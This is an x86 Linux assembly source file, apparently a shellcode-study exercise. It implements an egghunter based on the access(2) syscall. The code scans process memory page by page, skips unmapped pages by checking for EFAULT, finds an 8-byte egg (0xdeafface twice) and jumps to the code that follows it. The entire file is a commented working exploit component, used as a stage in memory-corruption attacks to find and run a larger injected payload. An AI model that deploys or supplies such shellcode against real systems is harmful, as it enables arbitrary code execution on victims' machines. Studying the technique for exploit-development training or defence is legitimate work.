; access2.nasm
; egghunter: access(2) revisited
; http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

global _start

section .text

_start:
    xor edx, edx        ; zeroing edx

page_align:
    or dx, 0xfff        ; 4095 ~ 0xfff PAGE_SIZE

inc_addr:
    inc edx             ; edx = 4096 ; move up PAGE_SIZE + 1
    lea ebx, [edx+0x4]  ; ebx = memory address to test = arg of access ~ pathname 
    push byte 0x21      ; syscall access = 33 ~ 0x21
    pop eax             ; eax = 0x21
    int 0x80
    
    ; check return value of syscall access
    cmp al, 0xf2        ; compare if EFAULT=0xf2 (lower bytes) ?
    jz page_align       ; pointer is invalid, jump to next page

    ; if memory is valid
    mov eax, 0xdeafface ; eax = the egg
    mov edi, edx        ; edi = pointer value
    scasd               ; compare edi to dword eax (egg) 4 bytes
    jnz inc_addr        ; if no match go to next addr (jump to inc_addr)
    scasd               ; if first 4 bytes is matched, check another next 4 bytes if it's matched too
    jnz inc_addr        ; if no match go to next addr (jump to inc_addr)

    ; if egg is found (8 bytes), then execute the payload 
    jmp edi